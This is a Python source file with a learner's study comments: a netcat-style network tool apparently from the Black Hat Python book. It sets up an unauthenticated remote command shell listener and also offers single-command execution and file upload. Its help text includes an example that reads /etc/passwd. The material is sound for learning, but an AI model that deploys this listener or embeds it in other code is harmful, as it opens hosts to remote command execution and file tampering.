# need for create toold -> loke thr docm ?
# create a command line interface lib
import argparse
import socket
import shlex
#process-creation -> interact with client progs
import subprocess
import sys
import textwrap
import threading

"""
    client side speak: add newline character
"""
#receive command and runs it, return string 
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    #check_output: runs a command in local OS + return output
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        #create socket obj
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # execute one method
    def run(self):
        # if set up listener
        if self.args.listen:
           self.listen()
        # otherwise
        else:
            self.send()

    def send(self):
        #connect with target and port
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            #if have buffer -> send to target first
            self.socket.send(self.buffer)
        # try/catch -> close connection with CTRL+C
        try:
            # loop for receive data from the target
            # if no more data -> beark out or print the response data 
            # + pause to get interactive input
            # + send data + continue loop  
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User Terminated.')
            self.socket.close()
            sys.exit()
    
    # method run as a listener
    def listen(self):
        #bind to the target and port
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # loop passing the connection socket to handle method
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    # execute task of the command line args it receives 1 or 2 or 3 or start a sell
    def handle(self, client_socket):
        # 1: pass command to execute fun + send output on the socket
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # 2: set up loop to listen for content on the listening socket and recive data 
        # until no more data comeing
        # write accumulated content in file
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())


        # 3: set up loop, send a prompt to the sender
        # + wait for a command string to come back
        # then execute command fun execute, +
        # return the output to sender
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    #command line interface
    parser = argparse.ArgumentParser(
        description='BHP Net Toll',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        #exp usibg command whene invokes --help
        epilog=textwrap.dedent('''Example:
                               netCat.py -t 192.168.1.108 -p 5555 -l -c 3 command shell
                               netCat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
                               netCat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
                               echo 'ABC' | ./netCat.py -t 192.168.1.108 -p 135 # echo text to server port 135
                               netCat.py -t 192.168.1.108 -p 5555 # connect to server
                                '''))
    #6 argement to behave prog
    # -c: interactive with the shell
    # -e: execute 1 specific command
    # -l: listener should be set up
    # -p: add the port number
    # -t: add IP target
    # -u: name of file upload
    # both sender and resiver can use prog -> args define invoke the sender or listen
    # -c, -e, -u included in -l : one listener side of communication
    # sender make connection to listener -> use -t and -p: define target listener
    #    
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l','--listen',action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int,default=5555,help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified ip')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    #set up the listener: invoke NetCat obj empty buffer string or send buffer from stdin
    if args.listen:
        buffer =''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    #call run to start up
    nc.run()

